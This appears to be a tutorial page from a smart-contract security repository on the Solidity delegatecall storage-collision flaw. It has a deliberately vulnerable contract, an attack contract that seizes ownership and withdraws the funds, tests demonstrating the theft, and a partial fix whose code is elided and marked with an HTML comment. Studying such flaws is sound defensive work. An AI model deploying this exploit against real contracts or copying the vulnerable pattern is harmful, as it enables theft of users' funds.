---
sidebar_position: 5
tags: [delegatecall, solidity, attack]
---


# Delegate call

### Description

The `delegatecall` opcode of Solidity allows delegating logic execution to another smart contract. For example, we want to call some useful smart contract that would handle the logic for us, e.g., SafeMath. However, such functionality may cause severe issues if the utility smart contract is stateful. Being identical to the opcode `call`, the `delegatecall` opcode carries its context over to the caller smart contract. And if it's stateful, it could override the caller's context.

Let's review the following example with the simple `FundRaiser` smart contract that uses the `Owner` library. Note that this is a simplified example to avoid complexity. But what's important is that the `Owner` library has a similar layout to the `FundRaiser`, meaning that the `owner` variable declaration has the same declaration position here.

```solidity title=/contracts/delegatecall/FundRaiser.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/FundRaiser.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Owner {
    // highlight-next-line
    address public owner;

    function setOwner() public {
        owner = msg.sender;
    }
}

contract FundRaiser {
    // highlight-next-line
    address public owner;
    uint256 balance;
    address caller;

    Owner public ownerService;

    constructor(Owner _ownerService) {
        owner = msg.sender;
        ownerService = Owner(_ownerService);
    }

    function deposit() public payable {
        balance += msg.value;
    }

    function withdraw() public onlyOwner {
        require(msg.sender == owner);

        require(balance > 0);

        (bool sent, ) = owner.call{value: balance}("");

        require(sent, "Transfer failed.");

        balance = 0;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    fallback() external payable {
        // highlight-next-line
        address(ownerService).delegatecall(msg.data);
    }
}
```

So the `Owner` would embed the context into the `FundRaiser` smart contract once the attacker executes the `fallback()` function, which calls the `setOwner`. Afterward, it's possible to call the `withdraw`, and the `onlyOwner` modifier would look to the new value of `owner`.

Let's consider the following example of the `Attack` smart contract that would attempt to acquire the `FundRaiser` funds:

```solidity title=/contracts/delegatecall/AttackFundRaiser.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/AttackFundRaiser.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IFundRaiser {
    function withdraw() external;

    function setOwner() external;
}

contract AttackFundRaiser {
    address public fundRaiser;
    event EtherReceived(uint256 value);

    constructor(address _fundRaiser) {
        fundRaiser = _fundRaiser;
    }

    function withdraw() public {
        IFundRaiser(fundRaiser).withdraw();
    }

    function attack() public {
        // TIP: Another way to call `fundRaiser.call(abi.encodeWithSignature("setOwner()"));`
        // highlight-next-line
        IFundRaiser(fundRaiser).setOwner();
    }

    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external payable {
        emit EtherReceived(msg.value);
    }
}

```


### How to test

Let's have a unit test reproducing this scenario:

```python sourceUrl=https://github.com/kkateq/solidity-hacks/blob/maintests/delegatecall/test_delegatecall.py title=/tests/delegatecall/test_delegatecall.py
import pytest
from brownie import exceptions
from scripts.delegatecall.deploy_and_attack import (
    deploy_attack,
    deploy_fund_raiser,
    deploy_fund_raiser_fixed,
    deploy_owner_fixed,
    deploy_owner_service,
)
from scripts.utils import get_attacker_account, get_user_account
from web3 import Web3


def test_delegatecall_attack():
    # 0. Deploy all contracts and send some funds over to the FundRaiser contract
    owner_service_contract = deploy_owner_service()
    fund_raiser_contract = deploy_fund_raiser(owner_service_contract.address)
    attack_contract = deploy_attack(fund_raiser_contract.address)

    tx = fund_raiser_contract.deposit(
        {"from": get_user_account(), "value": Web3.toWei(15, "ether")}
    )
    tx.wait(1)

    print(
        f"User has deposited {fund_raiser_contract.balance() / 10**18} ETH to FundRaiser"
    )

    print(f"FundRaiser owner is '{fund_raiser_contract.owner()}'")

    # 1. Call attack method of the Attack smart contract
    attack_tx = attack_contract.attack({"from": get_attacker_account()})
    attack_tx.wait(1)

    assert fund_raiser_contract.owner() == attack_contract.address
    assert fund_raiser_contract.balance() / 10**18 == 15
    assert attack_contract.balanceOf() / 10**18 == 0

    # 2. Withdraw the FundRaiser balance to Attack smart contract
    withdraw_tx = attack_contract.withdraw({"from": get_attacker_account()})
    withdraw_tx.wait(1)

    #  highlight-next-line
    assert fund_raiser_contract.balance() / 10**18 == 0
    # highlight-next-line
    assert attack_contract.balanceOf() / 10**18 == 15

```

he unit test above demonstrates the exploit of the `delegatecall` issue. The attacker easily transferred the raised funds over to the `Attack` smart contract.

Note this is a trivial scenario, not necessarily any attack would attempt to transfer money. It could also break the contract logic by similarly modifying the contract state.

### How to fix

The rule of thumb is to use the stateless **library** smart contracts. Also, Solidity provides the `library` keyword for implementing the library smart contracts. This keyword would ensure the smart contract is stateless and not self-destructible. In general, if `delegatecall` is used, it's necessary to pay attention to the state of all contracts in the application.

In our case, the fix is relatively simple:

```solidity title=/contracts/delegatecall/FundRaiserFixed.sol sourceUrl=https://github.com/kkateq/solidity-hacks/blob/main/contracts/delegatecall/FundRaiserFixed.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract OwnerFixed {
    <!-- No state -->
    function setOwner() public {
        // Some logic here
    }
}

contract FundRaiserFixed {
    ...
}
```

### Demo

The following unit tests shows that the attack is failing after the changes:

```python sourceUrl=https://github.com/kkateq/solidity-hacks/blob/maintests/delegatecall/test_delegatecall.py title=/tests/delegatecall/test_delegatecall.py

def test_delegatecall_attack_failed():
    # 0. Deploy all contracts and send some funds over to the FundRaiser contract
    owner_service_contract = deploy_owner_fixed()
    fund_raiser_contract = deploy_fund_raiser_fixed(owner_service_contract.address)
    attack_contract = deploy_attack(fund_raiser_contract.address)

    tx = fund_raiser_contract.deposit(
        {"from": get_user_account(), "value": Web3.toWei(15, "ether")}
    )
    tx.wait(1)

    print(
        f"User has deposited {fund_raiser_contract.balance() / 10**18} ETH to FundRaiser"
    )

    print(f"FundRaiser owner is '{fund_raiser_contract.owner()}'")

    # 1. Call attack method of the Attack smart contract
    attack_tx = attack_contract.attack({"from": get_attacker_account()})
    attack_tx.wait(1)

    assert fund_raiser_contract.owner() != attack_contract.address
    assert fund_raiser_contract.balance() / 10**18 == 15
    assert attack_contract.balanceOf() / 10**18 == 0

    with pytest.raises(exceptions.VirtualMachineError):
        # 2. Withdraw the FundRaiser balance to Attack smart contract
        withdraw_tx = attack_contract.withdraw({"from": get_attacker_account()})
        withdraw_tx.wait(1)

    #  highlight-next-line
    assert fund_raiser_contract.balance() / 10**18 == 15
    #  highlight-next-line
    assert attack_contract.balanceOf() / 10**18 == 0

```

### Important note

If we change the `Owner` layout to the following:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Owner {
    uint256 public anything;
    // highlight-next-line
    address public owner;

    function setOwner() public {
        owner = msg.sender;
    }
}

contract FundRaiser {
    // highlight-next-line
    address public owner;
    uint256 balance;
    address caller;
    ...

}

```

The issue would not be reproducible. It's not the fix, however, that you should consider!


**Thank you for reading and good luck with building secure blockchain!**
